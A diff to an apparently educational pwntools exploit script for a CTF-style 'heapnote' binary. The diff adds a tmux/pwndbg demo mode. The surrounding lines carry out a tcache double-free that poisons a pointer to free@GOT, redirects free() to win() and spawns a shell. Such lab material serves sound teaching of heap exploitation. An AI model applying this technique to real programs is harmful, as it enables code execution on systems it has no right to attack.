@@ -45,11 +45,32 @@ Run
 """
 
 from pwn import *
+import sys
+
+# --demo: attach pwndbg in a tmux split pane. `break menu` stops the proc after
+# every command with a clean pwndbg prompt (no Ctrl-C needed). At each DEMO hint
+# run the named pwndbg command in the gdb pane, then `continue` there to advance.
+# Without --demo the script runs straight to a shell (default; pipe-friendly).
+DEMO = "--demo" in sys.argv
 
 context.binary = exe = ELF("./heapnote")
 context.log_level = "info"
 
 p = process("./heapnote")
+
+# ---- live demo support (gdb/pwndbg + tmux) ----------------------------------
+# Run inside tmux:  python3 c1_double_free/exp.py --demo
+# pwndbg attaches in a right-hand pane with `break menu`: the proc stops after
+# every command, so you get a real pwndbg prompt to run `tcache`/`got`/`bins`.
+# Inspect at each DEMO hint, then `continue` in the gdb pane to advance.
+def demo_hint(msg: str):
+    if DEMO:
+        log.info("DEMO | %s", msg)
+
+if DEMO:
+    context.terminal = ["tmux", "splitw", "-h", "-p", "55"]
+    gdb.attach(p, gdbscript="break menu\ncontinue\n")
+    demo_hint("gdb attached (right pane). Proc stops after each command; inspect, then `continue` to advance.")
 
 # ---- menu helpers -----------------------------------------------------------
 def add(idx: int, size: int, data: bytes):
@@ -86,10 +107,12 @@ add(0, SZ, b"AAAA")
 delete(0)
 delete(0)
 log.info("double-free done: tcache list is A->A (self-loop), counts=2")
+demo_hint("run: tcache | 0x30 bin A->A self-loop, counts=2")
 
 # 3. malloc #1 -> returns A; write &free@GOT into A's fd
 add(1, SZ, p64(free_got))
 log.info("malloc #1 returned A; poisoned A->fd = &free@GOT")
+demo_hint("run: tcache | A->fd now &free@GOT")
 
 # 4. malloc #2 -> returns A again (dummy, drains the self-loop)
 add(2, SZ, b"DUMMY")
@@ -98,6 +121,7 @@ log.info("malloc #2 (dummy) returned A again; head now = &free@GOT")
 # 5. malloc #3 -> returns &free@GOT; write &win there
 add(3, SZ, p64(win_addr))
 log.info("malloc #3 returned &free@GOT; free@GOT overwritten with &win")
+demo_hint("run: got | free -> win")
 
 # 6. trigger: free() now jumps to win(). We must free a note whose data
 #    pointer is still valid -- but we must NOT allocate a fresh note here,
@@ -106,6 +130,7 @@ log.info("malloc #3 returned &free@GOT; free@GOT overwritten with &win")
 #    malloc(0x28) would hand back a bogus address and crash. notes[0]->data
 #    still points to A (del never NULLs it), so delete(0) frees A through
 #    the hijacked free@GOT -> win() -> system("/bin/sh").
+demo_hint("continue in gdb to trigger: next free() -> win() -> shell")
 delete(0)
 log.success("free() hijacked -> win() -> shell")
 
